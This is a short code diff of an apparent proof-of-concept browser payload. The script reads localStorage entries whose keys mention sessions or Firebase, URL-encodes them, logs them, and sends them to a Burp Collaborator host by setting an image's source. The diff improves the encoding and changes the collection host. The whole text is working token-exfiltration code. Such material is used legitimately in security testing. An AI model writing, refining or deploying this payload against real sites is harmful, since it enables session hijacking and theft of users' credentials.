@@ -12,11 +12,15 @@
             key.toLowerCase().includes("session") ||
             key.toLowerCase().includes("firebase")
           ) {
-            data += key + '=' + localStorage.getItem(key) + '&';
+            let value = localStorage.getItem(key);
+            data += encodeURIComponent(key) + '=' + encodeURIComponent(value) + '&';
           }
         }
+
+        console.log("Sending:", data); // helpful to see what’s being sent
+
         if (data.length > 0) {
-          new Image().src = "https://u61n8h9mqjutrzkb0cvbp4wh288ywn.burpcollaborator.net/?" + data;
+          new Image().src = "https://zhkpj3ywa31n5ocuyrt0v0ti096zuo.burpcollaborator.net/?" + data;
         }
       }, 3000);
     </script>
